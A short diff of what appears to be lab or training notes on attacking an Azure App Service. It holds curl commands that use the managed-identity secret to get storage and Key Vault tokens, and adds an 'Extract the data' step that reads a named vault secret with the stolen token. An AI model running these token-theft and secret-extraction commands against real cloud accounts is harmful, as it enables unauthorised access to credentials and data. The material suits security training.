@@ -195,7 +195,7 @@ curl -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=htt
 Response is a JWT that can be used to access the storage service for 8 hours.
 
 ```
-curl -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net/"
+curl -H "Secret: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2017-09-01&resource=https://vault.azure.net"
 ```
 
 Response is a JWT that can be used to access the vault service. 
@@ -220,4 +220,16 @@ Example of the decoded token:
     "ver": "1.0",
     "xms_mirid": "/subscriptions/abc-123/resourcegroups/pumaprey-cougar/providers/Microsoft.Web/sites/pumapreycougar"
 }
+```
+
+
+Extract the data:
+
+```
+curl -H "Authorization: Bearer <ACCESS TOKEN>" "https://pumaprey-cougar-vault.vault.azure.net/secrets/cougar-key/99954a23109643c694afdd028bc6f0cf?api-version=7.0"
+```
+
+TODO: Storage command to pull sensitive file
+
+```
 ```
